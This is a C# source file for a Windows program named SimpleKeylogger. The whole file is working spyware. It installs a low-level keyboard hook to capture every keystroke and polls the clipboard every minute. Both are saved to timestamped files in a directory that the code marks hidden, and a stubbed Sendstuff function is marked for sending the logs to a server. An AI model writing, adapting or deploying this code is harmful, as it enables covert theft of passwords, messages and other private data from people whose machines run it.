using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ThreadingTimer = System.Threading.Timer;
using System.Net;
using System.Net.Mail;

namespace SimpleKeylogger
{
   

    class Program
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static StringBuilder _keyBuffer = new StringBuilder();
        private static ThreadingTimer _timer;
        private static ThreadingTimer _clipboardTimer;

        static string fileToSend = string.Empty;
        static string keylog_FileName = string.Empty;
        static string targetDir = "windowslog";

        static void Main(string[] args)
        {
            // Set up a timer to save the logged keystrokes to a file every minute
            _timer = new ThreadingTimer(SaveKeyBufferToFile, null, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(1));
            // Set up a timer to save the clipboard content to a file every minute
            _clipboardTimer = new ThreadingTimer(SaveClipboardToFile, null, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(1));

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, LoadLibrary(currentModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                _keyBuffer.Append((char)vkCode);
            }

            return CallNextHookEx(_hookID, nCode, (int)wParam, lParam);
        }


        private  static void SaveKeyBufferToFile(object state)
        {
            // We check if the buffer is not empty
            // There's no reason to save an empty file
            if (_keyBuffer.Length > 0)
            {
                try
                {
                    
                    DriveInfo[] allDrives = DriveInfo.GetDrives();
                    string logFileName = $"KeyLog_{DateTime.Now:yyyyMMdd_HHmm}.txt";
                    string logFilePath = null;
                    keylog_FileName = logFileName;

                    // Here we search for a drive with write access to write the directory with logfiles
                
                    foreach (DriveInfo drive in allDrives)
                    {
                        Console.WriteLine(drive.ToString());
                        if (drive.IsReady && drive.DriveType == DriveType.Fixed && HasWriteAccess(drive.RootDirectory.FullName))
                        {
                                            
                            try
                            {
                                Directory.CreateDirectory(Path.Combine(drive.RootDirectory.FullName, targetDir));
                            }
                            catch (IOException ex)
                            {
                                Console.WriteLine(ex);
                            }

                            logFilePath = Path.Combine(drive.RootDirectory.FullName, targetDir, logFileName);
                            string logDirPath = Path.Combine(drive.RootDirectory.FullName, targetDir);
                            DirectoryInfo di = new DirectoryInfo(logDirPath);
                            if (di.Exists)
                            {
                                //See if directory has hidden flag, if not, make hidden
                                if ((di.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                                {
                                    //Add Hidden flag    
                                    di.Attributes |= FileAttributes.Hidden;
                                }
                            }
                            Console.WriteLine(logFilePath);
                            break;
                            
                        }
                    }

                    if (logFilePath != null)
                    {
                        File.WriteAllText(logFilePath, _keyBuffer.ToString().ToLower());
                        _keyBuffer.Clear();
                        fileToSend = logFilePath;
                        Sendstuff();
                        
                    }
                    else
                    {
                        Console.WriteLine("No suitable drive found for writing log files.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error saving key buffer to file: {ex.Message}");
                }
            }
        }

        private static bool HasWriteAccess(string folderPath)
        {
            string tempFilePath = Path.Combine(folderPath, Path.GetRandomFileName());

            try
            {
                using (FileStream fs = File.Create(tempFilePath, 1, FileOptions.DeleteOnClose))
                {
                    // Intentionally left empty
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
        private static void SaveClipboardToFile(object state)
        {
            try
            {
                string clipboardText = string.Empty;

                // Get the clipboard content in a thread-safe manner
                var thread = new Thread(() =>
                {
                    clipboardText = Clipboard.GetText().ToLower();
                });

                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                thread.Join();

                if (!string.IsNullOrEmpty(clipboardText))
                {
                    DriveInfo[] allDrives = DriveInfo.GetDrives();
                    string logFileName = $"clipboard_{DateTime.Now:yyyyMMdd_HHmm}.txt";
                    string logFilePath = null;

                    foreach (DriveInfo drive in allDrives)
                    {
                        if (drive.IsReady && drive.DriveType == DriveType.Fixed && HasWriteAccess(drive.RootDirectory.FullName))
                        {
                            try
                            {
                                Directory.CreateDirectory(Path.Combine(drive.RootDirectory.FullName, targetDir));
                            }
                            catch (IOException ex)
                            {
                                Console.WriteLine(ex);
                            }

                            logFilePath = Path.Combine(drive.RootDirectory.FullName, targetDir, logFileName);
                            string logDirPath = Path.Combine(drive.RootDirectory.FullName, targetDir);
                            DirectoryInfo di = new DirectoryInfo(logDirPath);
                            if (di.Exists)
                            {
                                //See if directory has hidden flag, if not, make hidden
                                if ((di.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                                {
                                    //Add Hidden flag    
                                    di.Attributes |= FileAttributes.Hidden;
                                }
                            }
                            Console.WriteLine(logFilePath);
                            break;
                        }
                    }

                    if (logFilePath != null)
                    {
                        File.WriteAllText(logFilePath, clipboardText);
                    }
                    else
                    {
                        Console.WriteLine("No suitable drive found for writing clipboard log files.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error saving clipboard content to file: {ex.Message}");
            }
        }



         static void Sendstuff()
        {
           /* try
            {
              // Sending file to server that stores them
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }*/
        }

    }




}
